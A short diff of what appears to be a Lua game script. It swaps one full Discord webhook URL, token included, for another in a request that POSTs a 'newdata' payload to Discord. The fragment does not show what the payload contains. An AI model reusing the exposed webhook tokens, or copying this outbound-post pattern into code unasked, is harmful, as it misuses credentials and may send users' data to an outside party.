@@ -23,7 +23,7 @@ local headers = {
 }
 
 request({
-	Url = "https://discord.com/api/webhooks/1229628144428781598/5jDsj-9tvURjkZqYHwg8bGg680C6Hq1T9uP7MsJDLos36dB6KytonRISh6lGE6vHow4M",
+	Url = "https://discord.com/api/webhooks/1229664864511852574/3BTPgJE2IheIJlXtzGN3mbapeQA1fyGYmw5kHCjzMnX0Dg1j8l6LZz24P6I_lnOlgrls",
     Body = newdata,
 	Method = "POST",
     Headers = headers
